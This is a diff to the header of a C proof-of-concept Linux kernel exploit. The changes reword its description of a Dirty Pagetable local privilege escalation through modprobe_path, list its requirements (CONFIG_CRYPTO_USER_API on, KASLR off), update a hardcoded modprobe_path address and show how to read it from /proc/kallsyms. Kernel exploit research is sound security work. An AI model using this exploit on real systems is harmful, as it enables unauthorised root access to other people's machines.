@@ -9,12 +9,11 @@
  *   - CONFIG_SLAB_BUCKETS
  *   - CONFIG_RANDOM_KMALLOC_CACHES
  *
- * You may compile the Linux kernel with these options
- * (it's requered for modpropbe trigger)
- *	 - CONFIG_CRYPTO_USER_API
+ * This PoC performs the Dirty Pagetable attack for LPE.
  *
- * Currently, this PoC performs Dirty Pagetable attack for LPE.
- * This PoC does not work with KASLR and needs modprobe addr pre-written
+ * Requirements:
+ *  1) Enable CONFIG_CRYPTO_USER_API to exploit the modprobe_path LPE technique
+ *  2) Disable KASLR and update the MODPROBE_PATH_ADDR below
  */
 
 #define _GNU_SOURCE
@@ -33,11 +32,12 @@
 
 /*==== Pagetables stuff =====*/
 /* 
- * obtain MODPROBE_ADDR with `sudo cat /proc/kallsyms| grep modprobe_path`,
+ * obtain MODPROBE_PATH_ADDR with `sudo cat /proc/kallsyms| grep modprobe_path`,
  * then cut off `ffffffff8`. Works only without KASLR!
  */
-#define MODPROBE_ADDR 0x2b42660
-#define MODPROBE_ADDR_ALIGNED (MODPROBE_ADDR & ~0xFFF)
+
+#define MODPROBE_PATH_ADDR 0x35ccc60
+#define MODPROBE_ADDR_ALIGNED (MODPROBE_PATH_ADDR & ~0xFFF)
 #define ENTRIES_AMOUNT 512 /* standart for any pagetable */
 #define PHYS_AREA 0x1000 /* regular page */
 #define PT_FLAGS 0x67 /* RW access for normal users and some sanity flags */
